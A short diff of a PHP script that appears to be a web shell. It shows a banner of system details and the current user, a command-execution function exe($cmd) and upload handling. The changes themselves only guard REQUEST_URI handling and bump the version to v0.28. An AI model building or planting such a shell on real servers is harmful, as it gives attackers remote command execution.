@@ -60,11 +60,12 @@ term;
 
 get_cpu_info();
 
-$tmp=$_SERVER['REQUEST_URI'];
-
-$p=strripos($tmp,"/");
-$link=substr($tmp,0,$p) . "/$upload_dir";
-$a=Array();$b=Array();
+$link="./";
+if(isset($_SERVER['REQUEST_URI'])) {
+	$tmp=$_SERVER['REQUEST_URI'];
+	$p=strripos($tmp,"/");
+	$link=substr($tmp,0,$p) . "/$upload_dir";
+}
 
 if(isset($_GET["upd"])) {
 
@@ -276,7 +277,7 @@ function get_cpu_info()
             echo php_uname("s") . " ". php_uname("r") . " " . php_uname("v") . "\n";
             echo "   $uptime\n";
             echo "   WHOAMI > $whoami\n";
-            echo str_repeat('=',95) . " v0.27\n";
+            echo str_repeat('=',95) . " v0.28\n";
     }
 
     echo "PWD: " . getcwd() . "\n\n";
@@ -413,4 +414,5 @@ function exe($cmd)
       //  echo $final;
     return $final;
 }
+
 
